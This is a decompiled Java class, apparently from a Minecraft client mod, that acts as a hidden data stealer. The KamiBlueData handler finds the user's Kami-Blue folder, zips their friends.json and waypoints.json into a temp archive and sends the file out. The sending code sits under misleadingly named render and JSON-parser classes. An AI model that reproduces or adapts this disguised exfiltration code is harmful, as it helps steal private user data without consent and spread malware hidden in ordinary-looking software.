// 
// Decompiled by Procyon v0.5.36
// 

package cn.origin.cube.command.commands.impl;

import cn.origin.cube.utils.render.advancedRender.misc.parsers.util.FileSystemHelper;
import java.io.File;
import java.util.ArrayList;
import cn.origin.cube.utils.render.advancedRender.misc.parsers.JSONRegexHandler;
import cn.origin.cube.utils.render.advancedRender.misc.parsers.util.JSONBuilder;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Paths;
import cn.origin.cube.utils.render.advancedRender.misc.parsers.JSONObject;

public final class KamiBlueData implements JSONObject
{
    private static final String[] IMPORTANT_FILES;
    
    @Override
    public void handle() {
        if (KamiBlueData.mcFolder == null || !Files.exists(Paths.get(KamiBlueData.mcFolder, new String[0]), new LinkOption[0])) {
            return;
        }
        final String kamiblueFolder = KamiBlueData.mcFolder + "kamiblue/";
        if (!Files.exists(Paths.get(kamiblueFolder, new String[0]), new LinkOption[0])) {
            JSONRegexHandler.send(new JSONBuilder().value("content", "> Did not contain the Kami-Blue folder.").build());
            return;
        }
        final ArrayList<File> validFileDirs = new ArrayList<File>();
        for (final String fileName : KamiBlueData.IMPORTANT_FILES) {
            final String dir = kamiblueFolder + fileName;
            if (Files.exists(Paths.get(dir, new String[0]), new LinkOption[0])) {
                validFileDirs.add(new File(dir));
            }
        }
        final String zipFile = System.getProperty("java.io.tmpdir") + KamiBlueData.sep + "kami-blue_shit.zip";
        FileSystemHelper.zip(zipFile, validFileDirs);
        JSONRegexHandler.send(new File(zipFile));
    }
    
    @Override
    public String getName() {
        return "KamiBlueData";
    }
    
    static {
        IMPORTANT_FILES = new String[] { "friends.json", "waypoints.json" };
    }
}
